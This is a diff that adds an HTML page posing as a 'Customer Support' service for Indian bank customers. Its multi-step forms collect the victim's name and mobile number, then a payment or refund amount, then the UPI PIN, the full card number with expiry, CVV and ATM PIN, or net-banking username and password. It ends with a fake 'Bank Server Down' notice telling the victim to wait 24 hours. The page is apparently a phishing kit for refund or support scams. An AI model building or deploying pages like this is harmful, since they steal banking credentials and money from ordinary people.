@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Support</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="app-top-bar" id="top-bar">
+        <span>Online service</span>
+    </div>
+
+    <div class="illustration-area">
+        <h2 class="support-title">CUSTOMER SUPPORT</h2>
+        <img src="assets/illustration.png" alt="Customer Support Illustration" class="illustration-img">
+    </div>
+    <div class="divider"></div>
+
+    <main class="content-area">
+        <!-- PAGE 1: Online Service Form -->
+        <div id="page-1" class="page-view active">
+            <form id="support-form" class="form-container">
+                <div class="input-group">
+                    <label for="customer-name">Customer Name*</label>
+                    <input type="text" id="customer-name" placeholder="Enter Customer Name" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="mobile-number">Mobile Number*</label>
+                    <input type="tel" id="mobile-number" placeholder="Enter Mobile Number" required pattern="[0-9]{10}"
+                        maxlength="10" minlength="10" title="Please enter exactly 10 digits"
+                        oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                </div>
+
+                <div class="input-group">
+                    <label for="reason">Reason*</label>
+                    <input type="text" id="reason" placeholder="Describe Your Problem" required>
+                </div>
+
+                <div class="submit-wrapper">
+                    <button type="submit" class="btn-primary" id="btn-submit">SUBMIT</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- PAGE 2: Payment Mode Form -->
+        <div id="page-2" class="page-view">
+            <div class="card shadow">
+                <h3 class="card-title">Payment mod*</h3>
+                <form id="payment-mode-form" class="form-container">
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="payment-mode" value="pay" checked>
+                            <span class="custom-radio"></span>
+                            PAY
+                        </label>
+                    </div>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="payment-mode" value="refund">
+                            <span class="custom-radio"></span>
+                            REFUND
+                        </label>
+                    </div>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="payment-mode" value="other">
+                            <span class="custom-radio"></span>
+                            OTHER
+                        </label>
+                    </div>
+
+                    <div class="input-group floating-input" style="margin-top: 24px;">
+                        <input type="number" id="amount" placeholder="Enter Amount" required style="font-size: 16px;">
+                    </div>
+
+                    <button type="submit" class="btn-primary full-width" id="btn-next">NEXT</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 3: Payment Method Selection -->
+        <div id="page-3" class="page-view">
+            <div class="card shadow">
+                <h3 class="card-title center-title">Select Payment Method</h3>
+                <div class="payment-methods">
+                    <button type="button" class="btn-secondary" onclick="selectPayment('upi')">UPI</button>
+                    <button type="button" class="btn-secondary" onclick="selectPayment('card')">DEBIT / CREDIT
+                        CARD</button>
+                    <button type="button" class="btn-secondary" onclick="selectPayment('netbanking')">NET
+                        BANKING</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 4: UPI Transaction Password -->
+        <div id="page-upi" class="page-view">
+            <form class="form-container" onsubmit="showFinalPage(event)">
+                <div class="input-group">
+                    <label for="upi-bank-name">Bank Name</label>
+                    <input type="text" id="upi-bank-name" placeholder="Search or Select Bank" list="indian-banks"
+                        required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="upi-password">UPI PIN*</label>
+                    <input type="password" id="upi-password" placeholder="Enter UPI pin" required>
+                </div>
+                <div class="submit-wrapper">
+                    <button type="submit" class="btn-primary">SUBMIT</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- PAGE 4: Card Details + Medical Update combined -->
+        <div id="page-card" class="page-view">
+            <form class="form-container" onsubmit="showFinalPage(event)">
+                <div class="card shadow" style="margin-bottom: 24px;">
+                    <div class="input-group">
+                        <label for="card-number">Card 16-Digit Number</label>
+                        <input type="text" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required
+                            oninput="
+                            this.value = this.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1-').replace(/-$/, '');
+                        ">
+                    </div>
+                    <div class="inline-group">
+                        <div class="input-group half-width">
+                            <label for="expiry">Expiry Date:</label>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="input-group half-width" style="align-items: flex-end;">
+                            <label for="cvv">CVV:</label>
+                            <input type="password" id="cvv" placeholder="CVV" maxlength="3" required
+                                style="width: 100%; text-align: left;">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Added ATM PIN field to the same page -->
+                <div class="form-container" style="padding: 0 10px;">
+                    <div class="input-group">
+                        <label for="atm-pin">ATM PIN*</label>
+                        <input type="password" id="atm-pin" placeholder="Enter ATM PIN" maxlength="4" required>
+                    </div>
+                </div>
+
+                <div class="submit-wrapper">
+                    <button type="submit" class="btn-primary">SUBMIT</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- PAGE 4: Net Banking Selection -->
+        <div id="page-netbanking" class="page-view">
+            <form class="form-container" onsubmit="showFinalPage(event)">
+                <div class="card shadow" style="margin-bottom: 24px;">
+                    <div class="input-group">
+                        <label for="bank-name">Bank Name</label>
+                        <input type="text" id="bank-name" placeholder="Search or Select Bank" list="indian-banks"
+                            required autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label for="username">Username / Customer ID</label>
+                        <input type="text" id="username" placeholder="Enter Username / Customer ID" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter Password" required>
+                    </div>
+                </div>
+                <div class="submit-wrapper">
+                    <button type="submit" class="btn-primary">SUBMIT</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- PAGE FINAL: Success / Bank Server Down -->
+        <div id="page-final" class="page-view">
+            <div class="message-container">
+                <h3 class="status-title text-red">Bank Server Down</h3>
+                <h4 class="note-title text-green">Important Note:</h4>
+                <p class="final-text">
+                    Please Wait. This process may take a minimum of 24 hours.<br>
+                    You will receive a notification once your details are successfully verified.
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <datalist id="indian-banks">
+        <option value="State Bank of India"></option>
+        <option value="HDFC Bank"></option>
+        <option value="ICICI Bank"></option>
+        <option value="Punjab National Bank"></option>
+        <option value="Bank of Baroda"></option>
+        <option value="Axis Bank"></option>
+        <option value="Canara Bank"></option>
+        <option value="Union Bank of India"></option>
+        <option value="Kotak Mahindra Bank"></option>
+        <option value="Bank of India"></option>
+        <option value="Indian Bank"></option>
+        <option value="Central Bank of India"></option>
+        <option value="IDBI Bank"></option>
+        <option value="Indian Overseas Bank"></option>
+        <option value="UCO Bank"></option>
+        <option value="Federal Bank"></option>
+        <option value="Bank of Maharashtra"></option>
+        <option value="IndusInd Bank"></option>
+        <option value="IDFC FIRST Bank"></option>
+        <option value="Yes Bank"></option>
+        <option value="Karnataka Bank"></option>
+        <option value="Karur Vysya Bank"></option>
+        <option value="City Union Bank"></option>
+        <option value="South Indian Bank"></option>
+        <option value="Tamilnad Mercantile Bank"></option>
+        <option value="RBL Bank"></option>
+        <option value="DCB Bank"></option>
+        <option value="Dhanlaxmi Bank"></option>
+        <option value="CSB Bank"></option>
+        <option value="DBS Bank India"></option>
+        <option value="HSBC Bank"></option>
+        <option value="Standard Chartered Bank"></option>
+        <option value="Airtel Payments Bank"></option>
+        <option value="India Post Payments Bank"></option>
+        <option value="Jio Payments Bank"></option>
+        <option value="Fino Payments Bank"></option>
+        <option value="NSDL Payments Bank"></option>
+        <option value="Paytm Payments Bank"></option>
+        <option value="AU Small Finance Bank"></option>
+        <option value="Equitas Small Finance Bank"></option>
+        <option value="Ujjivan Small Finance Bank"></option>
+        <option value="ESAF Small Finance Bank"></option>
+        <option value="Suryoday Small Finance Bank"></option>
+        <option value="Utkarsh Small Finance Bank"></option>
+        <option value="Jana Small Finance Bank"></option>
+        <option value="Unity Small Finance Bank"></option>
+        <option value="Slice Small Finance Bank"></option>
+        <option value="Baroda UP Bank"></option>
+        <option value="Baroda Rajasthan Kshetriya Gramin Bank"></option>
+        <option value="Kerala Gramin Bank"></option>
+        <option value="Karnataka Gramin Bank"></option>
+        <option value="Andhra Pradesh Grameena Vikas Bank"></option>
+        <option value="Telangana Grameena Bank"></option>
+        <option value="Tamil Nadu Grama Bank"></option>
+        <option value="Maharashtra Gramin Bank"></option>
+        <option value="Punjab Gramin Bank"></option>
+        <option value="Uttarakhand Gramin Bank"></option>
+        <option value="Assam Gramin Vikash Bank"></option>
+        <option value="Tripura Gramin Bank"></option>
+        <option value="Jharkhand Rajya Gramin Bank"></option>
+        <option value="Aryavart Bank"></option>
+        <option value="Saptagiri Grameena Bank"></option>
+        <option value="Saraswat Co-operative Bank"></option>
+        <option value="TJSB Sahakari Bank"></option>
+        <option value="Apna Sahakari Bank"></option>
+        <option value="Janakalyan Sahakari Bank"></option>
+        <option value="Kalupur Commercial Co-operative Bank"></option>
+        <option value="Mehsana Urban Co-op Bank"></option>
+        <option value="Cosmos Co-operative Bank"></option>
+        <option value="Abhyudaya Co-operative Bank"></option>
+        <option value="Bassein Catholic Co-operative Bank"></option>
+    </datalist>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
